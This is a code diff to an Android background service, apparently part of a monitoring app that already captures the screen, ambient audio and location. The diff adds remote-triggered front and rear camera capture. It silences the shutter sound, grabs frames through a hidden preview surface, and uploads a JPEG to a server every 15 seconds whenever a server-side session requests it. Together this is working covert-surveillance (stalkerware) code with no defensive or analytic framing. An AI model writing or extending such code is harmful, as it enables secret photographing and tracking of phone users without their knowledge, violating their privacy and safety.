@@ -22,6 +22,11 @@ import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
+import android.graphics.ImageFormat;
+import android.graphics.Rect;
+import android.graphics.SurfaceTexture;
+import android.graphics.YuvImage;
+import android.hardware.Camera;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.DisplayMetrics;
@@ -57,6 +62,8 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 
 public class ForegroundTelemetryService extends Service implements LocationListener {
     private static final String TAG = "ForegroundSvc";
@@ -83,6 +90,7 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private static final long APP_USAGE_SYNC_INTERVAL_MS = 15 * 60_000L;
     private static final long APP_USAGE_WINDOW_MS = 24 * 60 * 60_000L;
     private static final long REMOTE_SCREEN_FRAME_INTERVAL_MS = 60_000L;
+    private static final long REMOTE_CAMERA_FRAME_INTERVAL_MS = 15_000L;
     private static final int REMOTE_AUDIO_SEGMENT_MS = 60_000;
     private static final int REMOTE_AUDIO_SAMPLE_RATE = 16_000;
     private static final int MAX_MEDIA_ITEMS_PER_SCAN = 1500;
@@ -96,9 +104,13 @@ public class ForegroundTelemetryService extends Service implements LocationListe
     private volatile File screenRecorderFile = null;
     private volatile String activeScreenSessionId = null;
     private volatile String activeAudioSessionId = null;
+    private volatile String activeCameraSessionId = null;
+    private volatile String activeCameraFacing = null;
     private volatile boolean remoteScreenSegmentRunning = false;
     private volatile boolean remoteAudioSegmentRunning = false;
+    private volatile boolean remoteCameraCaptureRunning = false;
     private static final String KEY_REMOTE_SCREEN_LAST_UPLOAD_PREFIX = "remote_screen_last_upload_";
+    private static final String KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX = "remote_camera_last_upload_";
 
     @Override
     public void onCreate() {
@@ -315,6 +327,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if (activeSession == null || activeSession.optString("sessionId", "").length() == 0) {
             activeScreenSessionId = null;
             activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
             releaseScreenProjection();
             return;
         }
@@ -324,6 +338,8 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if ("ambient_audio".equals(requestType)) {
             activeScreenSessionId = null;
             activeAudioSessionId = sessionId;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
             releaseScreenProjection();
             maybeStartRemoteAudioSegment(sessionId);
             return;
@@ -332,12 +348,26 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         if ("screen".equals(requestType)) {
             activeScreenSessionId = sessionId;
             activeAudioSessionId = null;
+            activeCameraSessionId = null;
+            activeCameraFacing = null;
             maybeStartRemoteScreenSegment(sessionId);
+            return;
+        }
+
+        if ("camera_front".equals(requestType) || "camera_rear".equals(requestType)) {
+            activeScreenSessionId = null;
+            activeAudioSessionId = null;
+            activeCameraSessionId = sessionId;
+            activeCameraFacing = requestType;
+            releaseScreenProjection();
+            maybeStartRemoteCameraCapture(sessionId, requestType);
             return;
         }
 
         activeScreenSessionId = null;
         activeAudioSessionId = null;
+        activeCameraSessionId = null;
+        activeCameraFacing = null;
         releaseScreenProjection();
     }
 
@@ -365,12 +395,31 @@ public class ForegroundTelemetryService extends Service implements LocationListe
         }, "remote-audio-segment").start();
     }
 
+    private void maybeStartRemoteCameraCapture(String sessionId, String facing) {
+        if (remoteCameraCaptureRunning || !isCameraSessionActive(sessionId, facing)) return;
+        remoteCameraCaptureRunning = true;
+        new Thread(() -> {
+            try {
+                captureAndUploadCameraFrame(sessionId, facing);
+            } finally {
+                remoteCameraCaptureRunning = false;
+            }
+        }, "remote-camera-capture").start();
+    }
+
     private boolean isScreenSessionActive(String sessionId) {
         return sessionId != null && sessionId.equals(activeScreenSessionId);
     }
 
     private boolean isAudioSessionActive(String sessionId) {
         return sessionId != null && sessionId.equals(activeAudioSessionId);
+    }
+
+    private boolean isCameraSessionActive(String sessionId, String facing) {
+        return sessionId != null
+                && sessionId.equals(activeCameraSessionId)
+                && facing != null
+                && facing.equals(activeCameraFacing);
     }
 
     private void maybeUploadAllMedia() {
@@ -700,6 +749,158 @@ public class ForegroundTelemetryService extends Service implements LocationListe
                 }
             }
         }
+    }
+
+    private void captureAndUploadCameraFrame(String sessionId, String facing) {
+        if (!isCameraSessionActive(sessionId, facing)) return;
+        long now = System.currentTimeMillis();
+        long lastUploadAt = prefs().getLong(KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX + sessionId + "_" + facing, 0L);
+        if ((now - lastUploadAt) < REMOTE_CAMERA_FRAME_INTERVAL_MS) return;
+
+        if (!hasPermission(android.Manifest.permission.CAMERA)) {
+            try {
+                JSONObject ctx = new JSONObject();
+                ctx.put("sessionId", sessionId);
+                ctx.put("facing", facing);
+                ctx.put("reason", "missing_camera_permission");
+                sendMetric("remote_stream", "camera_frame", "permission_missing", null, null, ctx);
+            } catch (Exception ignored) {
+            }
+            return;
+        }
+
+        long startedAt = System.currentTimeMillis();
+        try {
+            int desiredFacing = "camera_front".equals(facing) ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
+            int cameraId = resolveCameraId(desiredFacing);
+            if (cameraId < 0) throw new IllegalStateException("camera_not_available");
+            byte[] jpeg = captureCameraJpeg(cameraId);
+            if (jpeg == null || jpeg.length == 0) throw new IllegalStateException("empty_camera_frame");
+            if (!isCameraSessionActive(sessionId, facing)) throw new IllegalStateException("stale_camera_session");
+
+            Map<String, String> form = new HashMap<>();
+            form.put("captureMode", "remote_live");
+            form.put("captureKind", facing);
+            form.put("supportSessionId", sessionId);
+            form.put("segmentStartedAtMs", String.valueOf(startedAt));
+            form.put("segmentDurationMs", "1");
+            JSONObject metadata = new JSONObject();
+            metadata.put("source", "android.hardware.Camera");
+            metadata.put("capturedAtMs", startedAt);
+            metadata.put("facing", facing);
+            form.put("metadataJson", metadata.toString());
+
+            long uploadStartedAt = System.currentTimeMillis();
+            String filename = "remote_" + facing + "_" + sessionId + "_" + startedAt + ".jpg";
+            String res = HttpClient.uploadFile(
+                    ApiConfig.api("/api/media/" + currentDeviceId() + "/upload"),
+                    "media",
+                    filename,
+                    jpeg,
+                    "image/jpeg",
+                    form,
+                    currentToken()
+            );
+            JSONObject parsed = new JSONObject(res != null ? res : "{}");
+            JSONObject ctx = new JSONObject();
+            ctx.put("sessionId", sessionId);
+            ctx.put("facing", facing);
+            if (parsed.optBoolean("ok")) {
+                prefs().edit().putLong(KEY_REMOTE_CAMERA_LAST_UPLOAD_PREFIX + sessionId + "_" + facing, System.currentTimeMillis()).apply();
+                ctx.put("fileId", parsed.optString("fileId", null));
+                sendMetric("remote_stream", "camera_frame", "ok", (int) (System.currentTimeMillis() - uploadStartedAt), (double) jpeg.length, ctx);
+            } else {
+                ctx.put("response", parsed.toString());
+                sendMetric("remote_stream", "camera_frame", "error", (int) (System.currentTimeMillis() - uploadStartedAt), null, ctx);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "captureAndUploadCameraFrame err", e);
+            try {
+                JSONObject ctx = new JSONObject();
+                ctx.put("sessionId", sessionId);
+                ctx.put("facing", facing);
+                ctx.put("error", e.getClass().getSimpleName());
+                sendMetric("remote_stream", "camera_frame", "error", (int) (System.currentTimeMillis() - startedAt), null, ctx);
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    private int resolveCameraId(int desiredFacing) {
+        try {
+            int count = Camera.getNumberOfCameras();
+            for (int i = 0; i < count; i++) {
+                Camera.CameraInfo info = new Camera.CameraInfo();
+                Camera.getCameraInfo(i, info);
+                if (info.facing == desiredFacing) return i;
+            }
+            return count > 0 ? 0 : -1;
+        } catch (Exception e) {
+            return -1;
+        }
+    }
+
+    private byte[] captureCameraJpeg(int cameraId) throws Exception {
+        final Object lock = new Object();
+        final byte[][] out = new byte[1][];
+        final Exception[] err = new Exception[1];
+        final CountDownLatch latch = new CountDownLatch(1);
+        Camera camera = null;
+        SurfaceTexture surfaceTexture = null;
+        try {
+            camera = Camera.open(cameraId);
+            try {
+                camera.enableShutterSound(false);
+            } catch (Exception ignored) {
+            }
+            Camera.Parameters params = camera.getParameters();
+            Camera.Size best = null;
+            for (Camera.Size size : params.getSupportedPreviewSizes()) {
+                if (best == null || (size.width * size.height) > (best.width * best.height)) best = size;
+            }
+            if (best != null) params.setPreviewSize(best.width, best.height);
+            params.setPreviewFormat(ImageFormat.NV21);
+            try {
+                params.set("shutter-sound", "off");
+            } catch (Exception ignored) {
+            }
+            camera.setParameters(params);
+            surfaceTexture = new SurfaceTexture(10);
+            camera.setPreviewTexture(surfaceTexture);
+            camera.startPreview();
+            camera.setOneShotPreviewCallback((data, cam) -> {
+                try {
+                    Camera.Size size = cam.getParameters().getPreviewSize();
+                    YuvImage yuv = new YuvImage(data, ImageFormat.NV21, size.width, size.height, null);
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    yuv.compressToJpeg(new Rect(0, 0, size.width, size.height), 82, baos);
+                    synchronized (lock) {
+                        out[0] = baos.toByteArray();
+                    }
+                } catch (Exception ex) {
+                    synchronized (lock) {
+                        err[0] = ex;
+                    }
+                } finally {
+                    latch.countDown();
+                }
+            });
+            if (!latch.await(4, TimeUnit.SECONDS)) throw new IllegalStateException("camera_capture_timeout");
+        } finally {
+            try {
+                if (camera != null) {
+                    camera.stopPreview();
+                    camera.release();
+                }
+            } catch (Exception ignored) {
+            }
+            try {
+                if (surfaceTexture != null) surfaceTexture.release();
+            } catch (Exception ignored) {
+            }
+        }
+        if (err[0] != null) throw err[0];
+        return out[0];
     }
 
     private void sendTelemetryOnce() {
